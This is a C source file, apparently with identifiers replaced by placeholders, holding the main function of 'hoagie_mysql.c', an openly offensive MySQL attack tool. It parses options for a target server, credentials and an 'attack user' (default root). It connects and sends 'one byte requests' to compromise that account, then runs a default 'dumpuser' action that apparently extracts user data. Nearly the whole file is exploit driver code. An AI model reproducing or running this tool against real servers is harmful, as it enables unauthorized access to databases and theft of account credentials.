
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int MYSQL ;


 char VAR_0 ;
 int FUNC_0 (int *,char*,char*) ;
 int FUNC_1 (int *,char*) ;
 int FUNC_2 (int ) ;
 int FUNC_3 (int ) ;
 char FUNC_4 (int,char**,char*) ;
 int FUNC_5 (int *) ;
 int FUNC_6 (int *,char*,char*,char*) ;
 char* VAR_1 ;
 int FUNC_7 (char*,...) ;
 int VAR_2 ;

int FUNC_8(int VAR_3, char **VAR_4) {
   MYSQL VAR_5;
   char VAR_6;
   char *VAR_7, *VAR_8, *VAR_9, *VAR_10, *VAR_11;

   VAR_7 = VAR_8 = VAR_9 = VAR_11 = VAR_10= ((void*)0);

   while ( (VAR_6 = FUNC_4(VAR_3, VAR_4, "ht:u:p:a:e:")) != VAR_0 ) {
       switch(VAR_6) {
           case 'h': FUNC_7("hoagie_mysql.c\n");
                     FUNC_7("-t ... mysql server (default localhost)\n");
             FUNC_7("-u ... username (default empty)\n");
                     FUNC_7("-p ... password (default empty)\n");
                     FUNC_7("-a ... attack user (default root)\n");
                     FUNC_7("-e ... action\n");
                     FUNC_7("-h ... this screen\n");
                     FUNC_2(0);
           case 't': VAR_7 = VAR_1;
                     break;
           case 'u': VAR_8 = VAR_1;
                     break;
           case 'p': VAR_9 = VAR_1;
                     break;
           case 'a': VAR_10 = VAR_1;
                     break;
           case 'e': VAR_11 = VAR_1;
       }
   }

   if (!VAR_7) VAR_7 = "localhost";
   if (!VAR_8) VAR_8 = "";
   if (!VAR_9) VAR_9 = "";
   if (!VAR_10) VAR_10 = "root";
   if (!VAR_11) VAR_11 = "dumpuser";

   FUNC_7("connecting to [%s] as [%s] ... ", VAR_7, VAR_8);
   FUNC_3(VAR_2);

   if (!FUNC_6(&VAR_5, VAR_7, VAR_8, VAR_9)) {
       FUNC_7("failed\n");
       return 0;
   } else {
       FUNC_7("ok\n");
   }

   FUNC_7("sending one byte requests with user [%s] ... \n", VAR_10);
   if (!FUNC_1(&VAR_5, VAR_10)) {
       FUNC_0(&VAR_5, VAR_11, VAR_8);
   } else {
       FUNC_7("attack failed\n");
   }
   FUNC_5(&VAR_5);

   return 0;
}
